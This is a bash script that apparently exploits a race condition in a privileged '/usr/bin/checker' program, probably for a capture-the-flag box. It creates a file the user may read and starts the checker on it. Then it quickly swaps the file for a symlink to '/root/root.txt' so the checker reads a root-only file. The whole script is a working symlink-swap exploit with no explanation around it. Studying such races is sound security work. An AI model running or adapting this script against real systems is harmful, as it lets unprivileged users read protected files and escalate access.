#!/bin/bash

allowed_to_read="${1}"

# remove the file if it's already there 
if [[ -e "${allowed_to_read}" ]]
then 
    rm "${allowed_to_read}"
fi 

# [re]create the file 
touch "${allowed_to_read}"

# run checker in the background
/usr/bin/checker "${allowed_to_read}" & 

sleep .75
rm "${allowed_to_read}" 

# link to the file we want to read 
ln -s /root/root.txt "${allowed_to_read}"